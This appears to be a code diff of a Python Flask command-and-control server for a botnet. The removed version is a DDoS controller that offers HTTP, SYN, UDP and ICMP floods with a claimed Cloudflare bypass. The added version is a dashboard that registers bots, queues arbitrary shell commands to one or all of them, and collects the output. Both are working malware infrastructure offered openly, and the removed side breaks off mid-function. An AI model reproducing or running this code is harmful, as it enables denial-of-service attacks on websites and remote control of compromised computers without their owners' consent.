@@ -1,638 +1,488 @@
-#!/usr/bin/env python3
-"""
-C2 Server - Fixed with better connection handling
-"""
-from flask import Flask, render_template_string, request, jsonify
-from flask_socketio import SocketIO, emit
-import json
+from flask import Flask, request, jsonify, render_template_string
 import threading
 import time
-import os
+import json
 from datetime import datetime
-from dataclasses import dataclass, asdict
-from typing import Dict, List, Optional
 
-PORT = int(os.environ.get('PORT', 5000))
 app = Flask(__name__)
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')
 
-# Configure SocketIO with better settings
-socketio = SocketIO(
-    app, 
-    cors_allowed_origins="*", 
-    async_mode='threading',
-    ping_timeout=120,  # Wait 2 minutes for pong
-    ping_interval=25,  # Send ping every 25 seconds
-    logger=False,
-    engineio_logger=False
-)
+# Store for bots
+bots = {}  # {bot_id: {info, last_seen, commands_queue}}
+commands_queue = {}
+responses = {}
+global_commands = []  # Commands to send to ALL bots
 
-clients = {}
-attacks = {}
-client_lock = threading.Lock()
-attack_lock = threading.Lock()
-
-@dataclass
-class ClientInfo:
-    id: str
-    name: str
-    hostname: str
-    platform: str
-    cpu_count: int
-    memory_total: int
-    connected_at: datetime
-    status: str = "idle"
-    current_attack: Optional[str] = None
-    last_seen: datetime = None
-    stats: Dict = None
-    
-    def __post_init__(self):
-        if self.stats is None:
-            self.stats = {"requests": 0, "rps": 0, "success": 0}
-        if self.last_seen is None:
-            self.last_seen = self.connected_at
-    
-    def to_dict(self):
-        """Convert to JSON-serializable dict"""
-        d = asdict(self)
-        d['connected_at'] = self.connected_at.isoformat()
-        d['last_seen'] = self.last_seen.isoformat()
-        return d
-
-@dataclass 
-class AttackInfo:
-    id: str
-    target: str
-    method: str
-    duration: int
-    rps: int
-    created_at: datetime
-    started_at: Optional[datetime] = None
-    completed_at: Optional[datetime] = None
-    status: str = "pending"
-    client_count: int = 0
-    completed_clients: List[str] = None
-    results: Dict = None
-    
-    def __post_init__(self):
-        if self.completed_clients is None:
-            self.completed_clients = []
-        if self.results is None:
-            self.results = {
-                "total_requests": 0,
-                "total_success": 0,
-                "avg_rps": 0,
-                "total_bytes": 0,
-                "client_results": {}
-            }
-    
-    def to_dict(self):
-        """Convert to JSON-serializable dict"""
-        d = asdict(self)
-        d['created_at'] = self.created_at.isoformat()
-        d['started_at'] = self.started_at.isoformat() if self.started_at else None
-        d['completed_at'] = self.completed_at.isoformat() if self.completed_at else None
-        return d
-
-HTML_TEMPLATE = """
+# Web dashboard HTML
+DASHBOARD = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Layer7 Real Attack C2</title>
+    <title>Botnet C2 Dashboard</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
-        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
-        .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #00ff00; padding-bottom: 20px; }
-        .header h1 { font-size: 2.5em; text-shadow: 0 0 10px #00ff00; }
-        .panel { background: linear-gradient(135deg, #111 0%, #1a1a1a 100%); border: 2px solid #00ff00; padding: 20px; margin: 20px 0; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,0,0.3); }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-        .stat-box { background: #000; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #00ff00; }
-        .stat-box h3 { font-size: 2em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
-        .stat-box p { color: #888; margin-top: 5px; }
-        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
-        .client-card { background: linear-gradient(135deg, #1a1a1a 0%, #222 100%); padding: 15px; border-radius: 8px; border-left: 4px solid #00ff00; transition: all 0.3s; }
-        .client-card:hover { transform: translateX(5px); box-shadow: 0 0 15px rgba(0,255,0,0.5); }
-        .client-card.attacking { border-color: #ff4444; animation: pulse 1s infinite; background: linear-gradient(135deg, #2a0000 0%, #3a0000 100%); }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
-        .attack-form { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
-        .form-group { display: flex; flex-direction: column; }
-        .form-group label { margin-bottom: 8px; color: #00ff00; font-weight: bold; }
-        .form-group input, .form-group select { padding: 12px; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; font-family: 'Courier New', monospace; }
-        .form-group input:focus, .form-group select:focus { outline: none; box-shadow: 0 0 10px rgba(0,255,0,0.5); }
-        .button-group { grid-column: 1 / -1; display: flex; gap: 15px; justify-content: center; margin-top: 20px; }
-        button { padding: 15px 30px; background: linear-gradient(135deg, #00aa00 0%, #00ff00 100%); color: #000; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.1em; transition: all 0.3s; font-family: 'Courier New', monospace; }
-        button:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,0,0.8); }
-        button.danger { background: linear-gradient(135deg, #aa0000 0%, #ff0000 100%); color: white; }
-        button.danger:hover { box-shadow: 0 0 20px rgba(255,0,0,0.8); }
-        .log { background: #000; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; height: 300px; overflow-y: auto; border: 1px solid #00ff00; }
-        .log-entry { margin: 5px 0; padding: 8px; border-left: 3px solid #00ff00; animation: slideIn 0.3s; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-        .log-error { border-color: #ff0000; color: #ff6666; }
-        .log-success { border-color: #00ff00; color: #00ff00; }
-        .log-warning { border-color: #ffff00; color: #ffff00; }
-        .method-badge { display: inline-block; padding: 3px 8px; background: #00ff00; color: #000; border-radius: 3px; font-size: 0.8em; font-weight: bold; margin-left: 5px; }
-        .layer-info { background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 3px solid #00ff00; }
-        .layer-info h4 { color: #00ff00; margin-bottom: 5px; }
-        .layer-info p { color: #888; font-size: 0.9em; }
+        body { 
+            font-family: 'Courier New', monospace; 
+            background: #0a0a0a; 
+            color: #00ff00; 
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-box {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 48px;
+            font-weight: bold;
+        }
+        .bots-list {
+            border: 1px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .bot {
+            background: #1a1a1a;
+            border-left: 3px solid #00ff00;
+            padding: 10px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .bot.offline {
+            border-left-color: #ff0000;
+            opacity: 0.5;
+        }
+        .bot-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .status-online { color: #00ff00; }
+        .status-offline { color: #ff0000; }
+        .command-panel {
+            border: 1px solid #00ff00;
+            padding: 20px;
+        }
+        input, textarea, select, button {
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            margin: 5px;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            cursor: pointer;
+        }
+        button:hover {
+            background: #00ff00;
+            color: #0a0a0a;
+        }
+        .log {
+            border: 1px solid #00ff00;
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+        .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            background: #1a1a1a;
+        }
+        #output {
+            background: #000;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 20px;
+            white-space: pre-wrap;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>⚡ EXTREME ATTACK CONTROLLER</h1>
-            <p style="font-size: 1.2em; color: #00ff00;">Thousands of Requests Per Minute • Cloudflare Bypass</p>
+    <div class="header">
+        <h1>🤖 BOTNET CONTROL CENTER 🤖</h1>
+        <p>Command & Control Dashboard</p>
+    </div>
+
+    <div class="stats">
+        <div class="stat-box">
+            <div class="stat-number" id="total-bots">0</div>
+            <div>Total Bots</div>
         </div>
-        
-        <div class="panel">
-            <h2>📊 Real-Time Statistics</h2>
-            <div class="stats-grid">
-                <div class="stat-box">
-                    <h3 id="client-count">0</h3>
-                    <p>Connected Clients</p>
-                </div>
-                <div class="stat-box">
-                    <h3 id="attacking-count">0</h3>
-                    <p>Attacking Now</p>
-                </div>
-                <div class="stat-box">
-                    <h3 id="total-requests">0</h3>
-                    <p>Total Requests</p>
-                </div>
-                <div class="stat-box">
-                    <h3 id="total-bandwidth">0 MB</h3>
-                    <p>Data Sent</p>
-                </div>
-                <div class="stat-box">
-                    <h3 id="active-attack">None</h3>
-                    <p>Active Attack</p>
-                </div>
-            </div>
+        <div class="stat-box">
+            <div class="stat-number" id="online-bots">0</div>
+            <div>Online</div>
         </div>
-        
-        <div class="panel">
-            <h2>🎯 Launch Distributed Attack</h2>
-            
-            <div class="layer-info">
-                <h4>📡 Attack Capabilities:</h4>
-                <p><strong>Layer 7:</strong> HTTP GET/POST (10,000+ RPS per client)</p>
-                <p><strong>Layer 4:</strong> TCP SYN, UDP Flood</p>
-                <p><strong>Layer 3:</strong> ICMP Ping Flood</p>
-                <p><strong>Features:</strong> Cloudflare Bypass, Multiple Browser Profiles, Keep-Alive</p>
-            </div>
-            
-            <div class="attack-form">
-                <div class="form-group">
-                    <label>🎯 Target URL/IP:</label>
-                    <input type="text" id="target" placeholder="https://example.com" value="https://example.com">
-                </div>
-                <div class="form-group">
-                    <label>⚡ Attack Method:</label>
-                    <select id="layer">
-                        <optgroup label="Layer 7 (HTTP/HTTPS)">
-                            <option value="http">HTTP GET Flood</option>
-                            <option value="post">HTTP POST Flood</option>
-                        </optgroup>
-                        <optgroup label="Layer 4 (Transport)">
-                            <option value="tcp">TCP SYN Flood</option>
-                            <option value="udp">UDP Flood</option>
-                        </optgroup>
-                        <optgroup label="Layer 3 (Network)">
-                            <option value="icmp">ICMP Ping Flood</option>
-                        </optgroup>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>⏱️ Duration (seconds):</label>
-                    <input type="number" id="duration" value="60" min="10" max="3600">
-                </div>
-                <div class="form-group">
-                    <label>💥 Power Level:</label>
-                    <select id="intensity">
-                        <option value="low">Low (Testing)</option>
-                        <option value="medium">Medium (Normal)</option>
-                        <option value="high">High (Aggressive)</option>
-                        <option value="extreme" selected>EXTREME (Maximum)</option>
-                    </select>
-                </div>
-                <div class="button-group">
-                    <button onclick="startAttack()">🚀 LAUNCH ATTACK</button>
-                    <button class="danger" onclick="stopAttack()">🛑 STOP ALL</button>
-                </div>
-            </div>
+        <div class="stat-box">
+            <div class="stat-number" id="offline-bots">0</div>
+            <div>Offline</div>
         </div>
-        
-        <div class="panel">
-            <h2>💻 Connected Clients (<span id="client-list-count">0</span>)</h2>
-            <div class="client-grid" id="clients-container">
-                <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
-                    No clients connected. Run client.py on computers.
-                </div>
-            </div>
-        </div>
-        
-        <div class="panel">
-            <h2>📝 Attack Log</h2>
-            <div class="log" id="log-container">
-                <div class="log-entry">Server started. Waiting for clients...</div>
-            </div>
+        <div class="stat-box">
+            <div class="stat-number" id="commands-sent">0</div>
+            <div>Commands Sent</div>
         </div>
     </div>
-    
-    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+
+    <div class="bots-list">
+        <h2>📱 CONNECTED BOTS</h2>
+        <div id="bots-container"></div>
+    </div>
+
+    <div class="command-panel">
+        <h2>⚡ COMMAND CENTER</h2>
+        
+        <div style="margin-bottom: 20px;">
+            <label>Target:</label><br>
+            <select id="target" style="width: 300px;">
+                <option value="all">🌐 ALL BOTS</option>
+            </select>
+        </div>
+
+        <div style="margin-bottom: 20px;">
+            <label>Quick Commands:</label><br>
+            <button onclick="sendQuickCmd('whoami')">whoami</button>
+            <button onclick="sendQuickCmd('pwd')">pwd</button>
+            <button onclick="sendQuickCmd('ls')">ls</button>
+            <button onclick="sendQuickCmd('uname -a')">uname -a</button>
+            <button onclick="sendQuickCmd('ps aux')">ps aux</button>
+            <button onclick="sendQuickCmd('ifconfig')">ifconfig</button>
+        </div>
+
+        <div>
+            <label>Custom Command:</label><br>
+            <input type="text" id="command" placeholder="Enter command..." style="width: 70%;">
+            <button onclick="sendCommand()">EXECUTE</button>
+        </div>
+
+        <div id="output"></div>
+    </div>
+
+    <div class="log">
+        <h3>📋 ACTIVITY LOG</h3>
+        <div id="log-container"></div>
+    </div>
+
     <script>
-        const socket = io();
-        let currentAttackId = null;
-        let totalBandwidth = 0;
+        let commandCount = 0;
         
-        socket.on('connect', () => {
-            addLog('✅ Connected to server', 'success');
-        });
-        
-        socket.on('client_connected', (data) => {
-            addLog(`✅ Client connected: ${data.client.name}`, 'success');
-            updateClientList();
-        });
-        
-        socket.on('client_disconnected', (data) => {
-            addLog(`⚠️ Client disconnected: ${data.client_id}`, 'warning');
-            updateClientList();
-        });
-        
-        socket.on('attack_started', (data) => {
-            currentAttackId = data.attack_id;
-            addLog(`🚀 ATTACK LAUNCHED: ${data.attack.target}`, 'success');
-            addLog(`   Method: ${data.attack.method.toUpperCase()} | Duration: ${data.attack.duration}s | Clients: ${data.attack.client_count}`, 'success');
-            updateStats();
-        });
-        
-        socket.on('client_attack_start', (data) => {
-            addLog(`⚡ ${data.client_id} started attacking`);
-            updateClientList();
-        });
-        
-        socket.on('client_attack_complete', (data) => {
-            const r = data.results;
-            addLog(`✅ Client completed: ${r.requests.toLocaleString()} requests @ ${r.rps.toFixed(0)} RPS`);
-            totalBandwidth += r.bytes_sent || 0;
-            document.getElementById('total-bandwidth').textContent = (totalBandwidth / 1024 / 1024).toFixed(2) + ' MB';
-            updateClientList();
-        });
-        
-        socket.on('attack_completed', (data) => {
-            addLog(`🎉 ALL CLIENTS COMPLETED!`, 'success');
-            addLog(`📊 Total: ${data.results.total_requests.toLocaleString()} requests | RPS: ${data.results.avg_rps.toFixed(0)}`, 'success');
-            currentAttackId = null;
-            updateStats();
-        });
-        
-        socket.on('system_stats', (data) => {
-            updateStats(data);
-        });
-        
-        function addLog(message, type = 'info') {
-            const log = document.getElementById('log-container');
-            const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            log.appendChild(entry);
-            log.scrollTop = log.scrollHeight;
-            
-            while (log.children.length > 100) {
-                log.removeChild(log.firstChild);
-            }
-        }
-        
-        function updateStats(stats = null) {
-            if (stats) {
-                document.getElementById('client-count').textContent = stats.clients.total;
-                document.getElementById('attacking-count').textContent = stats.clients.attacking;
-                document.getElementById('total-requests').textContent = stats.attacks.total_requests.toLocaleString();
-                document.getElementById('active-attack').textContent = stats.attacks.active > 0 ? 'Running' : 'None';
-            }
-        }
-        
-        function updateClientList() {
-            fetch('/api/clients')
+        function updateDashboard() {
+            fetch('/api/bots')
                 .then(r => r.json())
                 .then(data => {
-                    const container = document.getElementById('clients-container');
-                    const count = document.getElementById('client-list-count');
+                    const bots = data.bots;
+                    const total = bots.length;
+                    const online = bots.filter(b => b.status === 'online').length;
+                    const offline = total - online;
                     
-                    count.textContent = data.total;
+                    document.getElementById('total-bots').textContent = total;
+                    document.getElementById('online-bots').textContent = online;
+                    document.getElementById('offline-bots').textContent = offline;
                     
-                    if (data.total === 0) {
-                        container.innerHTML = `
-                            <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
-                                No clients connected. Run client.py on computers.
+                    // Update bots list
+                    const container = document.getElementById('bots-container');
+                    const select = document.getElementById('target');
+                    
+                    container.innerHTML = bots.map(bot => `
+                        <div class="bot ${bot.status === 'offline' ? 'offline' : ''}">
+                            <div class="bot-header">
+                                <div>
+                                    <strong>${bot.name}</strong> - ${bot.username}@${bot.hostname}
+                                </div>
+                                <div class="status-${bot.status}">
+                                    ${bot.status === 'online' ? '🟢 ONLINE' : '🔴 OFFLINE'}
+                                </div>
                             </div>
-                        `;
-                        return;
-                    }
+                            <div style="font-size: 12px; margin-top: 5px;">
+                                ${bot.cwd} | Last seen: ${new Date(bot.last_seen * 1000).toLocaleTimeString()}
+                            </div>
+                        </div>
+                    `).join('');
                     
-                    container.innerHTML = '';
-                    data.clients.forEach(client => {
-                        const card = document.createElement('div');
-                        card.className = `client-card ${client.status === 'attacking' ? 'attacking' : ''}`;
-                        const statusColor = client.status === 'attacking' ? '#ff4444' : '#00ff00';
-                        card.innerHTML = `
-                            <h3>${client.name} <span class="method-badge" style="background: ${statusColor}; color: ${client.status === 'attacking' ? '#fff' : '#000'}">${client.status.toUpperCase()}</span></h3>
-                            <p><strong>🖥️ Host:</strong> ${client.hostname}</p>
-                            <p><strong>💻 Platform:</strong> ${client.platform}</p>
-                            <p><strong>⚡ CPU:</strong> ${client.cpu_count} cores</p>
-                            <p><strong>💾 RAM:</strong> ${Math.round(client.memory_total / 1024 / 1024 / 1024)} GB</p>
-                            <p><strong>🕐 Connected:</strong> ${new Date(client.connected_at).toLocaleTimeString()}</p>
-                            ${client.stats.requests > 0 ? `<p><strong>📊 Requests:</strong> ${client.stats.requests.toLocaleString()}</p>` : ''}
-                            ${client.stats.rps > 0 ? `<p><strong>⚡ RPS:</strong> ${client.stats.rps.toFixed(0)}</p>` : ''}
-                        `;
-                        container.appendChild(card);
-                    });
+                    // Update target dropdown
+                    const currentValue = select.value;
+                    select.innerHTML = '<option value="all">🌐 ALL BOTS</option>' +
+                        bots.map(bot => 
+                            `<option value="${bot.id}">${bot.name} (${bot.status})</option>`
+                        ).join('');
+                    select.value = currentValue;
                 });
         }
         
-        function startAttack() {
+        function sendCommand() {
             const target = document.getElementById('target').value;
-            const layer = document.getElementById('layer').value;
-            const duration = parseInt(document.getElementById('duration').value);
-            const intensity = document.getElementById('intensity').value;
+            const cmd = document.getElementById('command').value;
             
-            if (!target) {
-                alert('❌ Please enter a target');
+            if (!cmd) {
+                alert('Enter a command!');
                 return;
             }
             
-            addLog(`🚀 Launching ${layer.toUpperCase()} attack...`, 'warning');
+            const endpoint = target === 'all' ? '/api/broadcast' : '/api/command';
+            const payload = target === 'all' ? 
+                { command: cmd } : 
+                { bot_id: target, command: cmd };
             
-            fetch('/api/attack/start', {
+            addLog(`Sending to ${target === 'all' ? 'ALL BOTS' : target}: ${cmd}`);
+            
+            fetch(endpoint, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({target, layer, duration, intensity})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             })
             .then(r => r.json())
             .then(data => {
-                if (data.success) {
-                    addLog(`✅ ${data.message}`, 'success');
+                if (data.results) {
+                    // Broadcast results
+                    let output = '=== BROADCAST RESULTS ===\\n';
+                    for (const [botId, result] of Object.entries(data.results)) {
+                        output += `\\n[${botId}]:\\n${result}\\n`;
+                    }
+                    document.getElementById('output').textContent = output;
                 } else {
-                    addLog(`❌ ${data.error}`, 'error');
+                    // Single bot result
+                    document.getElementById('output').textContent = data.result || data.message;
                 }
+                commandCount++;
+                document.getElementById('commands-sent').textContent = commandCount;
+                addLog(`✓ Command executed`);
+            })
+            .catch(err => {
+                addLog(`✗ Error: ${err}`);
             });
+            
+            document.getElementById('command').value = '';
         }
         
-        function stopAttack() {
-            fetch('/api/attack/stop', {method: 'POST'})
-                .then(r => r.json())
-                .then(data => {
-                    addLog(data.message, 'warning');
-                });
+        function sendQuickCmd(cmd) {
+            document.getElementById('command').value = cmd;
+            sendCommand();
         }
         
-        updateStats();
-        updateClientList();
-        setInterval(updateClientList, 3000);
+        function addLog(msg) {
+            const log = document.getElementById('log-container');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            log.insertBefore(entry, log.firstChild);
+            
+            // Keep only last 50 entries
+            while (log.children.length > 50) {
+                log.removeChild(log.lastChild);
+            }
+        }
+        
+        // Auto-refresh
+        setInterval(updateDashboard, 2000);
+        updateDashboard();
+        
+        // Enter key to send command
+        document.getElementById('command').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendCommand();
+            }
+        });
     </script>
 </body>
 </html>
-"""
+'''
 
 @app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
+def dashboard():
+    """Web dashboard"""
+    return render_template_string(DASHBOARD)
 
-@app.route('/api/clients')
-def get_clients():
-    with client_lock:
-        return jsonify({
-            "success": True,
-            "total": len(clients),
-            "clients": [client.to_dict() for client in clients.values()]
+@app.route('/register', methods=['POST'])
+def register_bot():
+    """Bot registration"""
+    data = request.json
+    bot_id = data.get('client_id')
+    
+    bots[bot_id] = {
+        'name': data.get('name'),
+        'hostname': data.get('hostname'),
+        'username': data.get('username'),
+        'cwd': data.get('cwd'),
+        'last_seen': time.time(),
+        'status': 'online'
+    }
+    
+    if bot_id not in commands_queue:
+        commands_queue[bot_id] = []
+    
+    print(f"[+] Bot connected: {data.get('name')} ({data.get('username')}@{data.get('hostname')})")
+    return jsonify({"status": "registered"})
+
+@app.route('/poll', methods=['POST'])
+def poll_commands():
+    """Bot polls for commands"""
+    data = request.json
+    bot_id = data.get('client_id')
+    
+    if bot_id in bots:
+        bots[bot_id]['last_seen'] = time.time()
+        bots[bot_id]['status'] = 'online'
+    
+    # Check for global commands first
+    if global_commands:
+        cmd = global_commands[0]
+        return jsonify(cmd)
+    
+    # Check for bot-specific commands
+    if bot_id in commands_queue and commands_queue[bot_id]:
+        cmd = commands_queue[bot_id].pop(0)
+        return jsonify(cmd)
+    
+    return jsonify({"command": None})
+
+@app.route('/response', methods=['POST'])
+def receive_response():
+    """Receive command response from bot"""
+    data = request.json
+    cmd_id = data.get('id')
+    result = data.get('result')
+    bot_id = data.get('client_id')
+    
+    responses[cmd_id] = {
+        'result': result,
+        'cwd': data.get('cwd'),
+        'bot_id': bot_id
+    }
+    
+    if bot_id in bots:
+        bots[bot_id]['last_seen'] = time.time()
+        if 'cwd' in data:
+            bots[bot_id]['cwd'] = data['cwd']
+    
+    return jsonify({"status": "received"})
+
+@app.route('/heartbeat', methods=['POST'])
+def heartbeat():
+    """Bot heartbeat"""
+    data = request.json
+    bot_id = data.get('client_id')
+    
+    if bot_id in bots:
+        bots[bot_id]['last_seen'] = time.time()
+        bots[bot_id]['status'] = 'online'
+    
+    return jsonify({"status": "ok"})
+
+@app.route('/api/bots', methods=['GET'])
+def api_bots():
+    """Get all bots info"""
+    current_time = time.time()
+    bot_list = []
+    
+    for bot_id, info in bots.items():
+        # Mark offline if not seen in 15 seconds
+        if current_time - info['last_seen'] > 15:
+            info['status'] = 'offline'
+        else:
+            info['status'] = 'online'
+        
+        bot_list.append({
+            'id': bot_id,
+            'name': info['name'],
+            'hostname': info['hostname'],
+            'username': info['username'],
+            'cwd': info['cwd'],
+            'status': info['status'],
+            'last_seen': info['last_seen']
         })
+    
+    return jsonify({"bots": bot_list})
 
-@app.route('/api/stats')
-def get_stats():
-    with client_lock:
-        total_clients = len(clients)
-        attacking = len([c for c in clients.values() if c.status == 'attacking'])
+@app.route('/api/command', methods=['POST'])
+def api_command():
+    """Send command to specific bot"""
+    data = request.json
+    bot_id = data.get('bot_id')
+    cmd = data.get('command')
+    cmd_id = str(time.time())
     
-    with attack_lock:
-        active_attacks = len([a for a in attacks.values() if a.status in ['running', 'pending']])
-        total_requests = sum(a.results["total_requests"] for a in attacks.values())
+    if bot_id not in commands_queue:
+        return jsonify({"status": "error", "message": "Bot not found"})
     
-    return jsonify({
-        "success": True,
-        "clients": {"total": total_clients, "attacking": attacking},
-        "attacks": {"active": active_attacks, "total_requests": total_requests}
+    commands_queue[bot_id].append({
+        "id": cmd_id,
+        "command": cmd,
+        "type": "execute"
     })
+    
+    print(f"[>] Command to {bots[bot_id]['name']}: {cmd}")
+    
+    # Wait for response
+    timeout = 30
+    start = time.time()
+    while cmd_id not in responses:
+        if time.time() - start > timeout:
+            return jsonify({"status": "timeout", "message": "Bot didn't respond"})
+        time.sleep(0.1)
+    
+    response_data = responses.pop(cmd_id)
+    result = response_data['result']
+    
+    if isinstance(result, dict):
+        result = result.get('output', str(result))
+    
+    return jsonify({"status": "success", "result": result})
 
-@app.route('/api/attack/start', methods=['POST'])
-def start_attack():
-    try:
-        data = request.json
-        target = data['target']
-        layer = data.get('layer', 'http')
-        duration = int(data.get('duration', 60))
+@app.route('/api/broadcast', methods=['POST'])
+def api_broadcast():
+    """Send command to ALL bots"""
+    data = request.json
+    cmd = data.get('command')
+    
+    print(f"[>>] BROADCAST: {cmd}")
+    
+    results = {}
+    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
+    
+    for bot_id in online_bots:
+        cmd_id = f"{time.time()}_{bot_id}"
         
-        attack_id = f"attack_{int(time.time())}"
-        
-        with attack_lock:
-            attack = AttackInfo(
-                id=attack_id,
-                target=target,
-                method=layer,
-                duration=duration,
-                rps=0,
-                created_at=datetime.now(),
-                status="starting"
-            )
-            attacks[attack_id] = attack
-        
-        with client_lock:
-            connected_clients = list(clients.keys())
-            attack.client_count = len(connected_clients)
-            
-            if attack.client_count == 0:
-                return jsonify({"success": False, "error": "No clients connected"}), 400
-            
-            for client_id in connected_clients:
-                clients[client_id].status = "attacking"
-                clients[client_id].current_attack = attack_id
-                
-                socketio.emit('attack_command', {
-                    'attack_id': attack_id,
-                    'target': target,
-                    'method': layer,
-                    'duration': duration,
-                    'command': 'start'
-                }, to=client_id)
-        
-        attack.status = "running"
-        attack.started_at = datetime.now()
-        
-        socketio.emit('attack_started', {
-            'attack_id': attack_id,
-            'attack': attack.to_dict()
+        commands_queue[bot_id].append({
+            "id": cmd_id,
+            "command": cmd,
+            "type": "execute"
         })
         
-        return jsonify({
-            "success": True,
-            "message": f"Attack launched on {attack.client_count} clients",
-            "attack_id": attack_id,
-            "client_count": attack.client_count
-        })
+        # Wait for response (shorter timeout for broadcast)
+        timeout = 10
+        start = time.time()
+        while cmd_id not in responses:
+            if time.time() - start > timeout:
+                results[bots[bot_id]['name']] = "Timeout"
+                break
+            time.sleep(0.1)
         
-    except Exception as e:
-        print(f"[!] Attack start error: {e}")
-        return jsonify({"success": False, "error": str(e)}), 500
-
-@app.route('/api/attack/stop', methods=['POST'])
-def stop_attack():
-    with client_lock:
-        for client in clients.values():
-            client.status = "idle"
-            client.current_attack = None
-            socketio.emit('attack_command', {'command': 'stop'}, to=client.id)
+        if cmd_id in responses:
+            response_data = responses.pop(cmd_id)
+            result = response_data['result']
+            if isinstance(result, dict):
+                result = result.get('output', str(result))
+            results[bots[bot_id]['name']] = result
     
-    with attack_lock:
-        for attack in attacks.values():
-            if attack.status == "running":
-                attack.status = "stopped"
-                attack.completed_at = datetime.now()
-    
-    socketio.emit('attack_stopped', {'message': 'All attacks stopped'})
-    return jsonify({"success": True, "message": "🛑 All attacks stopped"})
-
-@socketio.on('connect')
-def handle_connect():
-    client_id = request.sid
-    print(f"[+] Client connected: {client_id}")
-
-@socketio.on('client_register')
-def handle_client_register(data):
-    client_id = request.sid
-    
-    with client_lock:
-        client = ClientInfo(
-            id=client_id,
-            name=data.get('name', f'Client_{client_id[:8]}'),
-            hostname=data.get('hostname', 'Unknown'),
-            platform=data.get('platform', 'Unknown'),
-            cpu_count=data.get('cpu_count', 1),
-            memory_total=data.get('memory_total', 0),
-            connected_at=datetime.now()
-        )
-        clients[client_id] = client
-    
-    print(f"[+] Client registered: {client.name}")
-    
-    emit('welcome', {'message': 'Connected to C2 Server', 'client_id': client_id})
-    
-    socketio.emit('client_connected', {
-        'client': client.to_dict(),
-        'total_clients': len(clients)
-    })
-
-@socketio.on('client_stats')
-def handle_client_stats(data):
-    client_id = request.sid
-    with client_lock:
-        if client_id in clients:
-            clients[client_id].last_seen = datetime.now()
-            stats = data.get('stats', {})
-            if stats:
-                clients[client_id].stats.update(stats)
-
-@socketio.on('attack_started')
-def handle_client_attack_start(data):
-    client_id = request.sid
-    socketio.emit('client_attack_start', {
-        'client_id': client_id,
-        'target': data.get('target'),
-        'attack_id': data.get('attack_id')
-    })
-
-@socketio.on('attack_complete')
-def handle_attack_complete(data):
-    client_id = request.sid
-    attack_id = data.get('attack_id')
-    results = data.get('results', {})
-    
-    with client_lock:
-        if client_id in clients:
-            clients[client_id].status = "idle"
-            clients[client_id].current_attack = None
-            clients[client_id].stats.update(results)
-    
-    with attack_lock:
-        if attack_id in attacks:
-            attack = attacks[attack_id]
-            attack.completed_clients.append(client_id)
-            attack.results["client_results"][client_id] = results
-            attack.results["total_requests"] += results.get('requests', 0)
-            attack.results["total_success"] += results.get('success', 0)
-            attack.results["total_bytes"] += results.get('bytes_sent', 0)
-            
-            if len(attack.completed_clients) >= attack.client_count:
-                attack.status = "completed"
-                attack.completed_at = datetime.now()
-                
-                if attack.client_count > 0:
-                    attack.results["avg_rps"] = attack.results["total_requests"] / attack.duration if attack.duration > 0 else 0
-                    attack.results["total_success"] = (attack.results["total_success"] / attack.client_count) if attack.client_count > 0 else 0
-                
-                socketio.emit('attack_completed', {
-                    'attack_id': attack_id,
-                    'results': attack.results
-                })
-    
-    socketio.emit('client_attack_complete', {
-        'client_id': client_id,
-        'results': results
-    })
-
-@socketio.on('disconnect')
-def handle_disconnect():
-    client_id = request.sid
-    with client_lock:
-        if client_id in clients:
-            client = clients.pop(client_id)
